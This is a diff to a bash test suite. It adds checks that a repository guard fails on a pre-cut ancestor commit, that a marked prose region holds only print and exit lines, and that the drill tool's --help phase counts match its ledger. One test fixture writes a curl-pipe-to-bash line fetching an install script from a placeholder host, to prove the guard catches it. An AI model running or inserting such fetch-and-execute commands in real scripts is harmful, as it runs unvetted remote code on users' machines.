@@ -361,6 +361,66 @@ check "strong form: ...and does not red 'origin' or 'right' (the boundary)" 1 ""
   sf_names_converger "$SFPROBE"
 rm -f "$SFPROBE"
 
+# THE PRE-CUT TREE, not a fixture. The three tests above prove the helper can
+# match a line someone invented for it; the issue's test plan asks for the
+# exact guard driven against the ACTUAL tree this PR cut, and observed RED
+# there. The difference is not pedantry: a guard tuned to its own fixture is
+# the failure this repo keeps refusing, and only the real tree can show the
+# guard would have caught the thing it was written for.
+#
+# The pre-cut commit is LOCATED, never named. A hard-coded SHA rots the moment
+# the branch rebases, and a SKIP on "SHA not found" is a guard that silently
+# stops guarding — so this walks back from HEAD and asks the guard itself which
+# ancestor is the pre-cut one. Unreachable history is a FAILURE and not a skip;
+# CI checks out at fetch-depth 0 for exactly this class of check.
+sf_precut_ancestor() {
+  local c out="$1"
+  while read -r c; do
+    git -C "$ROOT" show "$c:bin/box" > "$out" 2>/dev/null || continue
+    if sf_names_converger "$out"; then printf '%s' "$c"; return 0; fi
+  done < <(git -C "$ROOT" rev-list --max-count=500 HEAD 2>/dev/null)
+  return 1
+}
+SFPRE="$(mktemp)"
+SFPRECOMMIT="$(sf_precut_ancestor "$SFPRE" || true)"
+if [ -n "$SFPRECOMMIT" ]; then
+  check "strong form: the guard reds on the real pre-cut tree (${SFPRECOMMIT:0:7}) (#214)" 0 "" \
+    sf_names_converger "$SFPRE"
+  check "strong form: ...and the pin guard reds on that same tree" 0 "" \
+    sf_names_pin "$SFPRE"
+  # The other half of a negative control: the same two helpers, same shell,
+  # green at HEAD. Red-there-and-green-here is the pair that means something;
+  # either alone is satisfied by a guard that is simply broken.
+  check "strong form: ...and both are green at HEAD (the control's other half)" 1 "" \
+    sf_names_converger "$ROOT/bin/box"
+else
+  check "strong form: a pre-cut ancestor is reachable to drive the guard against" 0 \
+    "" false
+fi
+rm -f "$SFPRE"
+
+# The extent of the exception, not just its count. The guard asserts there is
+# exactly ONE prose region, so a SECOND one cannot appear quietly — but it said
+# nothing about the first one GROWING, and an acting line added between the
+# existing sentinels passed silently. Bound it by the property the exception
+# was granted for: box may name the converger where it TEACHES, never where it
+# ACTS, so everything inside the region is a comment, the refusal function's
+# own frame, or a line that only prints or exits. A line count would red on a
+# reformat and pass on a curl; this reds on the curl.
+sf_region_only_prints() {
+  local stray
+  stray="$(awk '/^# box-strong-form-prose-begin$/,/^# box-strong-form-prose-end$/' "$1" \
+    | grep -vE '^#|^[[:space:]]*$|^refuse_role\(\)[[:space:]]*\{$|^\}$|^[[:space:]]+echo([[:space:]]|$)|^[[:space:]]+exit[[:space:]]+[0-9]+$')"
+  [ -z "$stray" ] || { printf 'acting line inside the prose region:\n%s\n' "$stray"; return 1; }
+}
+check "strong form: the prose region only prints and exits (#214)" 0 "" \
+  sf_region_only_prints "$ROOT/bin/box"
+SFPROBE="$(mktemp)"
+printf '# box-strong-form-prose-begin\nrefuse_role() {\n  echo "box: teaching is fine" >&2\n  curl -fsSL https://example.invalid/install.sh | bash\n}\n# box-strong-form-prose-end\n' > "$SFPROBE"
+check "strong form: ...and an acting line added INSIDE it reds (the guard's own test)" 1 "" \
+  sf_region_only_prints "$SFPROBE"
+rm -f "$SFPROBE"
+
 # ---------------------------------------------------------------------------
 # render_userdata (#81, #214) — the seed's ONE substitution, and after the cut
 # @BOX_USER@ is the whole of it. What used to live here was the pin group: a
@@ -5575,6 +5635,36 @@ help_names_every_phase() {
     done )
 }
 check "drill help: it names every phase the ledger declares" 0 "" help_names_every_phase
+# ...and by its NUMBER, not only by its key. The check above compared the two
+# lists of phase LETTERS, so --help could state a per-phase count that the
+# ledger contradicted and stay green — which is what happened: #214 moved B
+# from 51 to 45 and the header kept printing [51], so the drill answered one
+# number when asked directly and asserted another when it ran. Every phase's
+# bracketed integer is compared, not just the one that drifted, because the
+# next drift will be somewhere else. The count trails its phase's block, which
+# is one line for B and four for D, so it is read as "the last [N] before the
+# next phase opens".
+help_counts_match_ledger() {
+  ( set -u
+    # shellcheck disable=SC2034  # skipped() appends to it; the block assumes it
+    findings=()
+    # shellcheck disable=SC1090  # the extracted ledger, written above
+    . "$LEDGERFN"
+    local out k n
+    out="$(bash "$ROOT/drill/drill.sh" --help)" || { echo "--help failed"; exit 1; }
+    for k in "${PHASE_ORDER[@]}"; do
+      n="$(printf '%s\n' "$out" | awk -v k="$k" '
+        $0 ~ "^ *"k"\\. "                                   { inb = 1 }
+        inb && $0 ~ "^ *[A-Z]\\. " && $0 !~ "^ *"k"\\. "     { inb = 0 }
+        inb && match($0, /\[[0-9]+\]/) { v = substr($0, RSTART + 1, RLENGTH - 2) }
+        END { print v }')"
+      [ -n "$n" ] || { echo "--help states no probe count for phase $k"; exit 1; }
+      [ "$n" = "${PHASE_EXPECT[$k]}" ] \
+        || { echo "phase $k: --help says [$n], the ledger declares [${PHASE_EXPECT[$k]}]"; exit 1; }
+    done )
+}
+check "drill help: ...and every phase's COUNT matches the ledger's (#214)" 0 "" \
+  help_counts_match_ledger
 check "drill help: ...including the last one, so the window is not short again" 0 \
   "T. Teardown" bash "$ROOT/drill/drill.sh" --help
 check "drill help: ...and the window reaches the line after the list" 0 \
